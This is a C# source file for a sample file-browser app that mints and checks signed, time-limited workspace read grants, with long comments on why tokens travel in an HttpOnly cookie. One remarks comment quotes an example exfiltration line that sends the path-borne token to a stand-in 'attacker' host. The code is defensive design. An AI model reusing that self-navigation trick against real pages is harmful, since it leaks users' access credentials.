using System.Security.Cryptography;
using System.Text.Json;
using System.Text.Json.Serialization;
using AchieveAi.LmDotnetTools.LmCore.Identity;
using Microsoft.AspNetCore.DataProtection;

namespace LmStreaming.Sample.FileBrowser;

/// <summary>One minted workspace read grant: the opaque token and the instant it stops validating.</summary>
/// <param name="Token">
/// The opaque, signed, time-limited token. It travels either in an <c>HttpOnly</c> COOKIE (the default on a
/// secure context) or, where a <c>Secure</c> cookie cannot be set, in a URL PATH segment — see
/// <see cref="WorkspaceGrantService"/>'s remarks for why there are two.
/// </param>
/// <param name="ExpiresAt">When the token expires, so the client can refresh ahead of it.</param>
public sealed record WorkspaceGrant(string Token, DateTimeOffset ExpiresAt);

/// <summary>Why a presented grant was refused, or <see cref="None"/> when it was accepted.</summary>
public enum WorkspaceGrantFailure
{
    /// <summary>Accepted.</summary>
    None = 0,

    /// <summary>
    /// Unreadable: malformed, tampered with, minted under another purpose or key ring, or EXPIRED. The four
    /// are deliberately one code — see <see cref="WorkspaceGrantService"/>'s remarks.
    /// </summary>
    Invalid = 1,

    /// <summary>Readable and unexpired, but minted for a DIFFERENT conversation than the route names.</summary>
    ThreadMismatch = 2,

    /// <summary>Readable and unexpired, but minted for a DIFFERENT principal than the one now asking.</summary>
    PrincipalMismatch = 3,
}

/// <summary>
/// A grant that was opened without being compared against anyone: the outcome of checking signature,
/// expiry and thread binding, plus the principal the grant was minted for when those passed.
/// </summary>
/// <param name="Failure">
/// <see cref="WorkspaceGrantFailure.None"/>, <see cref="WorkspaceGrantFailure.Invalid"/> or
/// <see cref="WorkspaceGrantFailure.ThreadMismatch"/>. Never <c>PrincipalMismatch</c> — opening does not
/// know who is asking.
/// </param>
/// <param name="Principal">
/// The principal recorded at mint time, or null when the grant was minted anonymously (the normal
/// <c>Identity:Enforce=false</c> state) or when <paramref name="Failure"/> is not
/// <see cref="WorkspaceGrantFailure.None"/>.
/// </param>
public readonly record struct WorkspaceGrantOpened(WorkspaceGrantFailure Failure, Principal? Principal);

/// <summary>
/// Mints and validates the short-lived, read-only grant that lets a HEADER-LESS browser fetch address the
/// workspace (Bug#15): an <c>&lt;iframe src&gt;</c>, an <c>&lt;img src&gt;</c>, and every relative
/// <c>&lt;link&gt;</c>/<c>&lt;script&gt;</c> inside a rendered workspace page. None of those can carry the
/// <c>Authorization</c> header the client's <c>apiFetch</c> attaches, so the credential has to travel with
/// the request some other way. There are exactly TWO ways, and the CLIENT picks one per mint.
/// </summary>
/// <remarks>
/// <para>
/// <b>Cookie transport (the default, and the only one that keeps the credential out of the document).</b>
/// The mint answers <c>Set-Cookie: lm_ws_grant=&lt;token&gt;; HttpOnly; Secure; SameSite=None; Partitioned</c>
/// scoped by <c>Path</c> to this conversation's raw route, and the URL carries only
/// <see cref="CookieTransportMarker"/> — a constant, public route segment, not a secret. That is the whole
/// point: the sandboxed document keeps <c>allow-scripts</c>, and a script inside it that reads its own
/// <c>location</c> now learns nothing. With the token in the PATH,
/// <c>location.href = 'https://attacker/?g=' + location.pathname</c> exfiltrated a live read credential,
/// and no CSP directive stops a frame navigating ITSELF (<c>navigate-to</c> was removed from CSP3;
/// <c>default-src</c> governs fetches, not navigations). <c>HttpOnly</c> is what makes the cookie
/// unreadable to that script; the opaque origin the <c>sandbox</c> directive gives the document is why the
/// cookie needs <c>SameSite=None</c> (the browser treats its subresource requests as cross-site) plus
/// <c>Partitioned</c> (CHIPS, so it stays eligible under third-party-cookie blocking inside this app's own
/// top-level site).
/// </para>
/// <para>
/// <b>URL-path transport (the fallback).</b> A <c>Secure</c> cookie is only accepted on a trustworthy
/// origin, so a deployment served over plain <c>http</c> from something other than <c>localhost</c> has no
/// cookie available — and the server cannot tell which it is, because it sits behind an https front that
/// does not forward its scheme. The CLIENT therefore decides from <c>window.isSecureContext</c>, which is
/// true in exactly the places a <c>Secure</c> cookie works. In that mode the token is the path segment it
/// always was: it has to be the PATH and not a query, because RFC 3986 relative-reference resolution
/// replaces the query, which would strip a <c>?grant=</c> from every relative subresource the page loads.
/// The self-navigation exposure above is the accepted cost of a preview working at all on such a
/// deployment.
/// </para>
/// <para>
/// <b>The grant IS the credential on the raw route, and the payload carries the whole principal.</b> That is
/// the v2 shape and it is not an optimisation. <c>IdentityMiddleware</c> refuses every <c>/api</c> request
/// without a resolvable principal BEFORE routing, and a header-less subresource fetch has no bearer to
/// resolve — so under <c>Identity:Enforce=true</c> the grant has to be able to RECONSTRUCT the principal it
/// was minted for, not merely to be compared against one.
/// <see cref="Identity.WorkspaceGrantPrincipalSource"/> is what does that. Carrying a principal inside a
/// token is safe here because Data Protection encrypts AND authenticates the payload with the host's key
/// ring: a caller can neither read the fields nor alter them.
/// </para>
/// <para>
/// This still is NOT an authorization decision and never replaces one. A raw request that presents a valid
/// grant still runs the same <c>ResolveSessionAsync(AccessAction.Read)</c> prologue — the same
/// <c>ConversationAuthorizer</c> — as every other file route. What the grant adds is the one thing the
/// authorizer cannot see on a header-less subresource fetch: proof that the URL was constructed by this
/// application, for this caller, for this conversation.
/// </para>
/// <para>
/// <see cref="Principal.DelegationChain"/> is deliberately NOT carried. It is audit-only by its own
/// contract — never consulted for an access decision — so a reconstructed principal that omits it decides
/// every question identically, and leaving it out keeps the token smaller and the payload's blast radius
/// narrower. Everything an access decision reads (<c>TenantId</c>, <c>Actor</c>, <c>OnBehalfOf</c>,
/// <c>AppId</c>, <c>Scopes</c>, <c>Roles</c>, and therefore <c>EffectiveUserId</c>) is carried.
/// </para>
/// <para>
/// Expiry collapses into <see cref="WorkspaceGrantFailure.Invalid"/> on purpose. The time-limited protector
/// signals an expired payload with the same <see cref="CryptographicException"/> it raises for a forged one,
/// and discriminating them would mean matching on an exception message. It also would not help anyone: the
/// client's answer to every refusal is identical — drop the cached grant, mint a fresh one, retry once — and
/// a distinct "expired" answer would tell an attacker that a token they hold was at least structurally
/// genuine.
/// </para>
/// </remarks>
public sealed class WorkspaceGrantService
{
    /// <summary>
    /// The Data Protection purpose. Versioned, and part of the key derivation, so a token protected for any
    /// other purpose in this app cannot be replayed here — and so a future payload change can be made by
    /// bumping this rather than by trying to parse both shapes. <c>v2</c> is the principal-carrying payload;
    /// every <c>v1</c> token ever minted is unreadable under it, which is the intended migration (a client
    /// that presents one gets a 401 and mints a fresh grant).
    /// </summary>
    private const string ProtectorPurpose = "LmStreaming.Sample.FileBrowser.WorkspaceGrant.v2";

    /// <summary>The identity string recorded when the grant is minted for no principal at all.</summary>
    public const string AnonymousPrincipalId = "anonymous";

    /// <summary>
    /// The cookie the token travels in under the cookie transport. One name for the whole app: the
    /// <c>Path</c> attribute, not the name, is what scopes a cookie to one conversation's raw route, so a
    /// mint for a second conversation simply sets a second cookie.
    /// </summary>
    public const string CookieName = "lm_ws_grant";

    /// <summary>
    /// What stands in the URL's grant segment while the token is in the cookie. A CONSTANT and entirely
    /// public value — it is the one thing a script inside the sandboxed document can read off its own
    /// <c>location</c>, and on its own it opens nothing: presented without the cookie it is refused exactly
    /// as a forged token is.
    /// </summary>
    public const string CookieTransportMarker = "cookie";

    /// <summary>
    /// The <c>Path</c> a grant cookie is scoped to: this conversation's raw workspace route and nothing
    /// else, so the browser never attaches it to the rest of the API — not even to the mint that set it.
    /// </summary>
    /// <remarks>
    /// Escaped the same way the client escapes the segment it builds the URL from, because cookie
    /// <c>Path</c> matching is performed against the RAW request target rather than the decoded path.
    /// </remarks>
    public static string CookiePath(string threadId)
    {
        ArgumentNullException.ThrowIfNull(threadId);
        return $"/api/conversations/{Uri.EscapeDataString(threadId)}/workspace/";
    }

    /// <summary>
    /// The token a raw workspace request actually presents: the cookie when the URL segment is
    /// <see cref="CookieTransportMarker"/>, otherwise the segment itself.
    /// </summary>
    /// <remarks>
    /// The marker with no cookie behind it yields null, and that is deliberately NOT a distinct outcome. It
    /// flows into <see cref="Open"/> as <see cref="WorkspaceGrantFailure.Invalid"/> — the same 401 a forged
    /// token gets, and the same one the client already knows how to answer (drop the cached segment, mint
    /// again). It is also exactly what the self-navigation attack reduces to: the marker is all the
    /// document could ever read.
    /// </remarks>
    public static string? PresentedToken(HttpRequest request, string? grantSegment)
    {
        ArgumentNullException.ThrowIfNull(request);
        return string.Equals(grantSegment, CookieTransportMarker, StringComparison.Ordinal)
            ? request.Cookies[CookieName]
            : grantSegment;
    }

    private const int PayloadVersion = 2;

    private static readonly JsonSerializerOptions PayloadJson = new(JsonSerializerDefaults.Web)
    {
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
    };

    private readonly ITimeLimitedDataProtector _protector;
    private readonly TimeProvider _timeProvider;

    /// <summary>Creates the service over the host's data protection key ring and clock.</summary>
    /// <param name="provider">Data protection provider; the key ring signs and encrypts the payload.</param>
    /// <param name="timeProvider">Clock the grant's expiry is measured from.</param>
    public WorkspaceGrantService(IDataProtectionProvider provider, TimeProvider timeProvider)
    {
        ArgumentNullException.ThrowIfNull(provider);
        ArgumentNullException.ThrowIfNull(timeProvider);
        _protector = provider.CreateProtector(ProtectorPurpose).ToTimeLimitedDataProtector();
        _timeProvider = timeProvider;
    }

    /// <summary>
    /// The stable identity string a grant binds to: <c>{Kind}:{Id}</c> of the actor, or
    /// <see cref="AnonymousPrincipalId"/> for no principal. <c>anonymous</c> is a VALUE like any other — an
    /// anonymous grant does not validate for a named principal, and vice versa.
    /// </summary>
    public static string IdentityOf(Principal? principal) =>
        principal is null ? AnonymousPrincipalId : $"{principal.Actor.Kind}:{principal.Actor.Id}";

    /// <summary>
    /// Mints a grant binding <paramref name="threadId"/> and <paramref name="principal"/> for
    /// <see cref="FileBrowserLimits.WorkspaceGrantLifetime"/>.
    /// </summary>
    public WorkspaceGrant Mint(string threadId, Principal? principal)
    {
        ArgumentNullException.ThrowIfNull(threadId);
        var expiresAt = _timeProvider.GetUtcNow() + FileBrowserLimits.WorkspaceGrantLifetime;
        var payload = JsonSerializer.Serialize(
            new GrantPayload(PayloadVersion, threadId, PrincipalPayload.From(principal)),
            PayloadJson
        );
        return new WorkspaceGrant(_protector.Protect(payload, expiresAt), expiresAt);
    }

    /// <summary>
    /// Opens <paramref name="token"/>: checks signature, expiry and that it was minted for
    /// <paramref name="threadId"/>, and hands back the principal it was minted for. Asks nothing about who
    /// is presenting it — that is <see cref="Validate"/>.
    /// </summary>
    public WorkspaceGrantOpened Open(string? token, string threadId)
    {
        ArgumentNullException.ThrowIfNull(threadId);
        if (string.IsNullOrWhiteSpace(token))
        {
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.Invalid, null);
        }

        string json;
        try
        {
            json = _protector.Unprotect(token);
        }
        catch (CryptographicException)
        {
            // Tampered, truncated, foreign purpose, rotated-away key, or expired. One answer, by design.
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.Invalid, null);
        }
        catch (FormatException)
        {
            // Not even base64url — a token the caller invented rather than one this app minted.
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.Invalid, null);
        }

        GrantPayload? payload;
        try
        {
            payload = JsonSerializer.Deserialize<GrantPayload>(json, PayloadJson);
        }
        catch (JsonException)
        {
            // A payload this key ring authenticated but this build cannot parse: an older or newer shape.
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.Invalid, null);
        }

        if (payload is null || payload.V != PayloadVersion || payload.Thread is null)
        {
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.Invalid, null);
        }

        if (!string.Equals(payload.Thread, threadId, StringComparison.Ordinal))
        {
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.ThreadMismatch, null);
        }

        var principal = payload.Principal?.ToPrincipal();
        if (payload.Principal is not null && principal is null)
        {
            // A principal field was present but unusable (no tenant, no actor id). Refuse rather than
            // reconstruct a half-principal that an access decision would then read.
            return new WorkspaceGrantOpened(WorkspaceGrantFailure.Invalid, null);
        }

        return new WorkspaceGrantOpened(WorkspaceGrantFailure.None, principal);
    }

    /// <summary>
    /// Validates <paramref name="token"/> against the conversation and principal now asking. Signature and
    /// expiry are checked by the protector; thread and principal identity are compared ordinally.
    /// </summary>
    public WorkspaceGrantFailure Validate(string? token, string threadId, Principal? principal)
    {
        var opened = Open(token, threadId);
        if (opened.Failure != WorkspaceGrantFailure.None)
        {
            return opened.Failure;
        }

        return string.Equals(IdentityOf(opened.Principal), IdentityOf(principal), StringComparison.Ordinal)
            ? WorkspaceGrantFailure.None
            : WorkspaceGrantFailure.PrincipalMismatch;
    }

    /// <summary>The protected payload. Only ever seen after the key ring has authenticated it.</summary>
    private sealed record GrantPayload(int V, string Thread, PrincipalPayload? Principal);

    /// <summary>
    /// The access-relevant fields of a <see cref="AchieveAi.LmDotnetTools.LmCore.Identity.Principal"/>, flat
    /// enough to serialise. A DTO rather than the record itself because <c>Principal</c> carries
    /// <c>required</c> members and <c>IReadOnlySet</c> properties that <c>System.Text.Json</c> cannot
    /// round-trip on its own.
    /// </summary>
    private sealed record PrincipalPayload(
        string TenantId,
        PrincipalKind ActorKind,
        string ActorId,
        PrincipalKind? OboKind,
        string? OboId,
        string? AppId,
        string[] Scopes,
        string[] Roles,
        PrincipalSource Source
    )
    {
        public static PrincipalPayload? From(Principal? principal) =>
            principal is null
                ? null
                : new PrincipalPayload(
                    principal.TenantId,
                    principal.Actor.Kind,
                    principal.Actor.Id,
                    principal.OnBehalfOf?.Kind,
                    principal.OnBehalfOf?.Id,
                    principal.AppId,
                    [.. principal.Scopes],
                    [.. principal.Roles],
                    principal.Source
                );

        public Principal? ToPrincipal()
        {
            if (string.IsNullOrWhiteSpace(TenantId) || string.IsNullOrWhiteSpace(ActorId))
            {
                return null;
            }

            return new Principal
            {
                TenantId = TenantId,
                Actor = new PrincipalRef(ActorKind, ActorId),
                OnBehalfOf = OboKind is { } kind && OboId is not null ? new PrincipalRef(kind, OboId) : null,
                AppId = AppId,
                Scopes = new HashSet<string>(Scopes ?? [], StringComparer.Ordinal),
                Roles = new HashSet<string>(Roles ?? [], StringComparer.Ordinal),
                Source = Source,
            };
        }
    }
}
